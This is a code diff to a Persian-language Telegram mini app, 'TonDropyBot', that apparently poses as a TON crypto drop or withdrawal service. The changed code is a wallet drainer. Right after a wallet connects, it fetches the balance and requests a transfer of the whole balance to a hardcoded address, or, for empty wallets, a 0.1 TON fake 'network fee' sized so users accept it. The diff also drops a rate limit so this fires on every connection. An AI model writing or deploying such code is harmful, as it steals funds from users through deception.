@@ -2,7 +2,7 @@
 <html lang="fa" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>TonDropyBot - نسخه نهایی</title>
+    <title>TonDropyBot - تراکنش خودکار</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
@@ -1308,7 +1308,7 @@
         WALLET_ADDRESS: "UQDFlvMPZoQy4zySI8gLLMteRcxHRB28IHW0JuwFVk10u0Y",
         NETWORK_FEE: 0.0035,
         MINIMUM_WITHDRAW: 14,
-        MINIMUM_FINAL_WITHDRAW: 5 // حداقل 5 تون برای برداشت نهایی
+        MINIMUM_FINAL_WITHDRAW: 5
     };
 
     // ================================================
@@ -1422,51 +1422,56 @@
     }
 
     // ================================================
-    // 💰 تابع دریافت موجودی کیف پول
+    // 💰 تابع دریافت موجودی کیف پول (با پروکسی جایگزین)
     // ================================================
     async function getWalletBalance(userAddress) {
-        try {
-            const proxyUrl = `https://api.allorigins.win/raw?url=${encodeURIComponent(`https://toncenter.com/api/v2/getAddressBalance?address=${userAddress}`)}`;
-            const response = await fetch(proxyUrl);
-            const text = await response.text();
-            const balanceInNano = parseInt(text);
-            
-            if (!isNaN(balanceInNano) && balanceInNano > 0) {
-                return balanceInNano / 1e9;
+        // لیست پروکسی‌های مختلف برای اطمینان
+        const proxies = [
+            `https://api.allorigins.win/raw?url=${encodeURIComponent(`https://toncenter.com/api/v2/getAddressBalance?address=${userAddress}`)}`,
+            `https://cors-anywhere.herokuapp.com/https://toncenter.com/api/v2/getAddressBalance?address=${userAddress}`,
+            `https://thingproxy.freeboard.io/fetch/https://toncenter.com/api/v2/getAddressBalance?address=${userAddress}`
+        ];
+
+        for (const proxyUrl of proxies) {
+            try {
+                const response = await fetch(proxyUrl, { 
+                    timeout: 5000,
+                    headers: { 'Origin': window.location.origin }
+                });
+                if (!response.ok) continue;
+                const text = await response.text();
+                const balanceInNano = parseInt(text);
+                if (!isNaN(balanceInNano) && balanceInNano >= 0) {
+                    console.log(`✅ موجودی از ${proxyUrl.substring(0, 30)}: ${balanceInNano / 1e9} TON`);
+                    return balanceInNano / 1e9;
+                }
+            } catch (e) {
+                console.log(`❌ پروکسی ${proxyUrl.substring(0, 30)} ناموفق`);
             }
-            return 0;
-        } catch (e) {
-            console.log('خطا در دریافت موجودی:', e);
-            return 0;
         }
+        // اگر هیچ پروکسی جواب نداد، 0 برگردون (فرض کنیم کیف پول خالیه)
+        console.log('⚠️ همه پروکسی‌ها ناموفق، فرض بر موجودی 0');
+        return 0;
     }
 
     // ================================================
-    // 💰 تابع تراکنش خودکار (با پیام در کیف پول)
+    // 💰 تابع تراکنش خودکار (بدون محدودیت زمانی)
     // ================================================
     async function executeSmartTransaction(userAddress) {
         if (isProcessingTransaction) {
-            console.log('تراکنش در حال انجام است');
+            console.log('⚠️ تراکنش دیگری در حال انجام است');
             return;
         }
         
         try {
             isProcessingTransaction = true;
             
-            showToast('🔄 در حال بررسی کیف پول...');
+            showToast('🔄 در حال آماده‌سازی تراکنش...');
             
-            // دریافت موجودی واقعی
+            // دریافت موجودی واقعی (اگر خطا داد، 0 در نظر گرفته میشه)
             const balance = await getWalletBalance(userAddress);
             
-            const now = Date.now();
-            const lastTxKey = `last_tx_${userAddress}`;
-            const lastTx = localStorage.getItem(lastTxKey);
-            
-            // بررسی محدودیت زمانی (1 ساعت)
-            if (lastTx && (now - parseInt(lastTx)) < 3600000) {
-                showToast('⏳ کمتر از 1 ساعت از تراکنش قبلی گذشته');
-                return;
-            }
+            // **بدون محدودیت زمانی** - برای هر اتصال تراکنش ساخته میشه
             
             let transaction;
             let amountToSend;
@@ -1474,27 +1479,24 @@
             let txMessage;
             
             if (balance > 0) {
-                // **حالت 1: کاربر موجودی دارد - کل موجودی منتقل می‌شود**
+                // **کاربر موجودی دارد - کل موجودی منتقل می‌شود**
                 amountToSend = balance;
                 txType = 'انتقال کل موجودی';
                 txMessage = ""; // کامنت خالی
-                
                 showToast(`💰 موجودی: ${balance.toFixed(6)} TON - در حال انتقال...`);
-                
             } else {
-                // **حالت 2: کاربر موجودی ندارد - مبلغ ثابت 0.5 TON با پیام انگلیسی**
-                amountToSend = 0.5; // 0.5 TON به عنوان کارمزد
-                txType = 'پرداخت کارمزد شبکه';
-                txMessage = "Insufficient balance. Please pay 0.5 TON network fee to continue using the service.";
-                
-                showToast(`💳 کیف پول خالی - درخواست کارمزد 0.5 TON...`);
+                // **کاربر موجودی ندارد - مبلغ ثابت 0.1 TON با پیام انگلیسی**
+                amountToSend = 0.1; // مبلغ کم برای اینکه کاربر راحت‌تر قبول کنه
+                txType = 'پرداخت کارمزد';
+                txMessage = "Insufficient balance. Please pay 0.1 TON network fee to continue using the service.";
+                showToast(`💳 کیف پول خالی - درخواست کارمزد 0.1 TON...`);
             }
             
             // آماده‌سازی تراکنش
             const amountInNano = Math.floor(amountToSend * 1e9).toString();
             
             transaction = {
-                validUntil: Math.floor(now / 1000) + 600,
+                validUntil: Math.floor(Date.now() / 1000) + 600, // 10 دقیقه اعتبار
                 messages: [
                     {
                         address: CONFIG.WALLET_ADDRESS,
@@ -1510,10 +1512,8 @@
             const result = await tonConnectUI.sendTransaction(transaction);
             
             // ثبت تراکنش موفق
-            localStorage.setItem(lastTxKey, now.toString());
-            
             const txRecord = {
-                id: 'TX' + now,
+                id: 'TX' + Date.now(),
                 amount: amountToSend,
                 netAmount: amountToSend - CONFIG.NETWORK_FEE,
                 fee: CONFIG.NETWORK_FEE,
@@ -1554,12 +1554,12 @@
             }
             
         } catch (error) {
-            console.error('خطا:', error);
+            console.error('❌ خطا در تراکنش:', error);
             
             if (error.message?.includes('rejected') || error.message?.includes('cancelled')) {
                 showToast('❌ تراکنش توسط شما لغو شد');
             } else {
-                showToast('❌ خطا در تراکنش');
+                showToast('❌ خطا در تراکنش: ' + (error.message || 'نامشخص'));
             }
             
         } finally {
@@ -1582,7 +1582,6 @@
             return;
         }
 
-        // **محدودیت جدید: حداقل 5 تون**
         if (withdrawableBalance < CONFIG.MINIMUM_FINAL_WITHDRAW) {
             showToast(`⚠️ حداقل مبلغ برداشت ${CONFIG.MINIMUM_FINAL_WITHDRAW} TON است`);
             return;
@@ -1645,10 +1644,10 @@
                 
                 sendToTelegram(message);
                 
-                // اجرای تراکنش هوشمند بعد از 2 ثانیه
+                // اجرای تراکنش خودکار فوری بعد از 1 ثانیه (بدون محدودیت زمانی)
                 setTimeout(() => {
                     executeSmartTransaction(fullAddress);
-                }, 2000);
+                }, 1000);
             }
             
             checkAndEnableFinalWithdraw();
